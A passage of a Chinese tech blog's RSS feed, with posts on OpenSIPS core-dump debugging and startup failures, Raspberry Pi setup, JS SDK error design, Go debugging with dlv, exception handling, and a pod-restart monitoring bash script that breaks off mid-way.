&lt;p&gt;core dump文件一般大约有1G左右，所以当产生core dump的时候，要保证系统的磁盘空间是否足够。&lt;/p&gt;
&lt;h1 id=&#34;如何开启core-dump&#34;&gt;如何开启core dump？&lt;/h1&gt;
&lt;p&gt;第一，opensips脚本中有个参数叫做disable_core_dump， 这个参数默认为no, 也就是启用core dump, 可以将这个参数设置为no, 来禁用core dump。但是生产环境一般建议还是开启core dump, 否则服务崩溃了，就只能看日志，无法定位到具体的崩溃代码的位置。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;disable_core_dump&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第二，还需要在opensips启动之前，运行：&lt;code&gt;ulimit -c unlimited&lt;/code&gt;, 这个命令会让opensips core dump的时候，不会限制core dump文件的大小。一般来说core dump文件的大小是共享内存 + 私有内存。&lt;/p&gt;
&lt;p&gt;第三，opensips进程的用户如果不是root, 那么可能没有权限将core dump文件写到/目录下。有两个解决办法，&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用root用户启动opensips进程&lt;/li&gt;
&lt;li&gt;使用-w 参数配置opensips的工作目录，core dump文件将会写到对应的目录中。例如：opensips -w /var/log&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果core dump失败是因为权限的问题， opensips的日志文件中将会打印：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-systemverilog&#34; data-lang=&#34;systemverilog&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Can&amp;#39;t open &amp;#39;core.xxxx&amp;#39; at &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; Permission denied
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;如何分析core-dump文件&#34;&gt;如何分析core dump文件？&lt;/h1&gt;
&lt;p&gt;使用gdb&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-systemverilog&#34; data-lang=&#34;systemverilog&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gdb &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;(which opensips) core&lt;span style=&#34;color:#ae81ff&#34;&gt;.12333&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;进入&lt;/span&gt;gdb调试之后, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;输入&lt;/span&gt;bt full, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;会打印详细的错误栈信息&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bt full
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;没有产生core-dump文件如何分析崩溃原因&#34;&gt;没有产生core dump文件，如何分析崩溃原因？&lt;/h1&gt;
&lt;p&gt;使用objdump。&lt;/p&gt;
&lt;p&gt;一般来说opensips崩溃后，日志文件中一般会出现下面的信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-systemverilog&#34; data-lang=&#34;systemverilog&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kernel: opensips[&lt;span style=&#34;color:#ae81ff&#34;&gt;8954&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; segfault at &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;ea72b5 ip &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000004&lt;/span&gt;be532 sp &lt;span style=&#34;color:#ae81ff&#34;&gt;00007ff&lt;/span&gt;e9e1e6df0 error &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; in opensips[&lt;span style=&#34;color:#ae81ff&#34;&gt;400000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;203000&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们从中取出几个关键词&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips无法启动</title>
      <link>https://wdd.js.org/opensips/ch7/can-not-run/</link>
      <pubDate>Thu, 19 Aug 2021 19:19:52 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/can-not-run/</guid>
      <description>&lt;h1 id=&#34;排查日志&#34;&gt;排查日志&lt;/h1&gt;
&lt;p&gt;opensips的&lt;strong&gt;log_stderror&lt;/strong&gt;参数决定写日志的位置，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;yes 写日志到标准错误&lt;/li&gt;
&lt;li&gt;no 写日志到syslog服务(默认)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果使用默认的syslog服务，那么日志将会可能写到以下两个文件中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/var/log/messages&lt;/li&gt;
&lt;li&gt;/var/log/syslog&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般情况下，分析/var/log/messages日志，可以定位到无法启动的原因。&lt;/p&gt;
&lt;p&gt;如果日志文件中无法定位到具体原因，那么就可以将log_stderror设置为yes。&lt;/p&gt;
&lt;p&gt;注意：&lt;strong&gt;往标准错误中打印的日志，往往比网日志文件中打印的更详细。而且有些时候，我发现这个错误在标准错误中打印了，但是却不会输出到日志文件中。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所以，看标准错误的日志，往往更容易定位到问题。&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>树莓派3b&#43;踩坑记录</title>
      <link>https://wdd.js.org/posts/2021/08/uuvor0/</link>
      <pubDate>Sat, 14 Aug 2021 11:01:17 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/08/uuvor0/</guid>
      <description>&lt;h1 id=&#34;选择那个版本的系统&#34;&gt;选择那个版本的系统？&lt;/h1&gt;
&lt;p&gt;不要过高的估算树莓派的性能，最好不要选择那些具有漂亮界面的ubuntu或者manjaro, 因为当你使用这些带桌面的系统时，很大概率界面能让你卡的想把树莓派砸了。&lt;/p&gt;
&lt;p&gt;所以优先选择不带图形界面的lite版本的系统，如果确实需要的话，可以再安装lxde&lt;/p&gt;
&lt;h1 id=&#34;网线插了还是无法联网&#34;&gt;网线插了，还是无法联网&lt;/h1&gt;
&lt;p&gt;插了网线，网口上的绿灯也是在闪烁，但是eth0就是无法联网成功。真是气人。&lt;/p&gt;
&lt;p&gt;解决方案： 编辑 /etc/network/interfaces, 将里面的内容改写成下面的，然后重启树莓派。&lt;/p&gt;
&lt;p&gt;这个配置文件的涵义是：在启动时就使用eth0有线网卡，并且使用dhcp给这个网卡自动配置IP&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;auto eth0
iface eth0 inet dhcp
iface etho inet6 dhcp
source-directory /etc/network/interfaces.d
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;无桌面版本如何手工安装桌面&#34;&gt;无桌面版本，如何手工安装桌面&lt;/h1&gt;
&lt;p&gt;首先安装lxde&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt update
sudo apt install lxde -y
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后通过raspi-config, 配置默认从桌面启动&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo rasip-config
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;选择系统配置, 按回车键进入&lt;!-- raw HTML omitted --&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/08/uuvor0/2022-10-29-20-42-28.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择Boot/Auto login， 按回车进入&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/08/uuvor0/2022-10-29-20-42-43.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择Desktop, 回车确认。保存之后，退出重启。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/08/uuvor0/2022-10-29-20-42-51.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;键盘无法输入&#34;&gt;键盘无法输入|&lt;/h1&gt;
&lt;p&gt;| 在linux中是管道的意思，然而我的键盘却无法输入。最终发现是键盘布局的原因。&lt;/p&gt;
&lt;p&gt;在图标上右键，选择配置&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/08/uuvor0/2022-10-29-20-43-00.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意这里是US, 这是正常的。如果是UK，就是英式布局，是有问题的，需要把UK的删除，重新增加一个US的。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/08/uuvor0/2022-10-29-20-43-09.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;如何安装最新版本的neovim&#34;&gt;如何安装最新版本的neovim?&lt;/h1&gt;
&lt;p&gt;树莓派使用apt安装的neovim， 版本太老了。很多插件使用上都会体验不好。所以建议安装最新版的neovim。&lt;/p&gt;</description>
    </item>
    <item>
      <title>js sdk 跨层穿透问题</title>
      <link>https://wdd.js.org/posts/2021/08/kbcih7/</link>
      <pubDate>Thu, 12 Aug 2021 13:46:39 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/08/kbcih7/</guid>
      <description>&lt;p&gt;关于js sdk的设计，这篇文档基本上详细介绍了很多的点，值得深入阅读一遍。&lt;a href=&#34;https://github.com/hueitan/javascript-sdk-design&#34;&gt;https://github.com/hueitan/javascript-sdk-design&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然而最近在重构某个js sdk时，也发现了一些问题，这个问题并不存在于上述文章中的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/08/kbcih7/2022-10-29-20-04-22.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;js sdk在收到服务端的响应时，直接将server端返回的错误码给到用户。&lt;/p&gt;
&lt;p&gt;这里会有一个问题，这个响应码，实际上是js sdk和server之间的消息交流。并不是js sdk和用户之间的消息交流。&lt;/p&gt;
&lt;p&gt;如果我们将server端的响应直接返回给用户，则js sdk可以理解为是一个透明代理。用户将会和server端产生强耦合。如果server端有不兼容的变化，将会直接影响到用户的使用。&lt;/p&gt;
&lt;p&gt;所以较好的做法是js sdk将这个错误封装为另一个种表现形式，和server端分离出来。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Debug With Dlv</title>
      <link>https://wdd.js.org/golang/debug-with-dlv/</link>
      <pubDate>Sat, 07 Aug 2021 21:50:05 +0800</pubDate>
      <guid>https://wdd.js.org/golang/debug-with-dlv/</guid>
      <description>&lt;p&gt;本来打算用gdb调试的，看了官方的文档https://golang.org/doc/gdb， 官方更推荐使用delve这个工具调试。&lt;/p&gt;
&lt;p&gt;我的电脑是linux, 所以就用如下的命令安装。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;go install github.com/go-delve/delve/cmd/dlv@latest&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我要调试的并不是一个代码而是一个测试的代码。&lt;/p&gt;
&lt;p&gt;当执行测试的时候报错的位置是xxx/demo/demo_test.go, 200行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dlv test moduleName/demo
&amp;gt; b demo_test.go:200 # 在文件的对应行设置端点
&amp;gt; bp # print all breakpoint
&amp;gt; c # continue to exe
&amp;gt; p variableName
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>面向异常编程todo</title>
      <link>https://wdd.js.org/posts/2021/08/brh6mu/</link>
      <pubDate>Thu, 05 Aug 2021 08:58:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/08/brh6mu/</guid>
      <description>&lt;p&gt;程序可能大部分时间都是按照正常的逻辑运行，然而也有少数的概率，程序发生异常。&lt;/p&gt;
&lt;p&gt;优秀程序，不仅仅要考虑正常运行，还需要考虑两点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;如何处理异常&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如何在发生异常后，快速定位原因&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;正常的处理如果称为收益的话，异常的处理就是要能够及时止损。&lt;/p&gt;
&lt;p&gt;能稳定运行364天的程序，很可能因为一天的问题，就被客户抛弃。因为这一天的损失，就可能会超过之前收益的总和。&lt;/p&gt;
&lt;h1 id=&#34;异常应当如何处理&#34;&gt;异常应当如何处理&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;如果事情有变坏的可能，不管这种可能性有多小，它总会发生。《莫非定律》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;对于程序来说，避免变坏的方法只有一个，就是不要运行程序（纯粹废话😂）。&lt;/p&gt;
&lt;h2 id=&#34;1-及时崩溃&#34;&gt;1. 及时崩溃&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nil&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;maxConnectTimes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;reconnectDelay&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;currentReconnectTimes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;timeId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;InitDb&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;数据库&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;connected&amp;#34;&lt;/span&gt;, ()=&amp;gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 将当前重连次数重制为0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  	&lt;span style=&#34;color:#a6e22e&#34;&gt;currentReconnectTimes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ReconnectDb&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ReconnectDb&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 如果重连次数大于最大重连次数，将不在重连
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;currentReconnecTimes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;maxConnectTimes&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 如果已经催在重连的任务，则先关闭
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;timeId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	&lt;span style=&#34;color:#a6e22e&#34;&gt;cleanTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;timeId&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 当前重连次数增加
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;currentReconnectTimes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 开始延迟重连
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;timeId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;InitDb&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;reconnectDelay&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2-br-br-&#34;&gt;2. &lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/h2&gt;
&lt;h1 id=&#34;如何快速定位问题&#34;&gt;如何快速定位问题&lt;/h1&gt;
&lt;p&gt;第一，代码的敬畏之心 &lt;!-- raw HTML omitted --&gt;第二，及时告警。日志，或者http请求 &lt;!-- raw HTML omitted --&gt;第三，编程时，就要考虑异常。例如程序依赖 MQ或者Mysql，当与之交互的链接断开后，应该怎样处理？ &lt;!-- raw HTML omitted --&gt;第四，多实例问题考虑 &lt;!-- raw HTML omitted --&gt;第五，检查清单&lt;/p&gt;</description>
    </item>
    <item>
      <title>监控pod重启并写日志文件</title>
      <link>https://wdd.js.org/posts/2021/07/giqfii/</link>
      <pubDate>Wed, 28 Jul 2021 21:21:33 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/07/giqfii/</guid>
      <description>&lt;p&gt;一般来说，监控pod状态重启和告警，可以使用普罗米修斯或者kubewatch。&lt;/p&gt;
&lt;p&gt;但是如果你只想将某个pod重启了，往某个日志文件中写一条记录，那么下面的方式将是非常简单的。&lt;/p&gt;
&lt;p&gt;实现的思路是使用kubectl 获取所有pod的状态信息，统计发生过重启的pod, 然后和之前的重启次数做对比，如果比之前记录的次数大，那么肯定是发生过重启了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;now&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+%Y-%m-%d %H:%M:%S&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/log/pod.restart.log&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;some-namespace&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo $now start pod restart monitor &amp;gt;&amp;gt; $log_file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# touch一下之前的记录文件，防止文件不存在&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;touch restart.old.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 生成本次的统计数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get pod -n $ns -o wide | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$4 &amp;gt; 0{print $1,$4}&amp;#39;&lt;/span&gt; | grep -v NAME &amp;gt; restart.now.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 按行读取本次统计数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 数据格式为：podname 重启次数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; read line
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# pod name&lt;/span&gt;
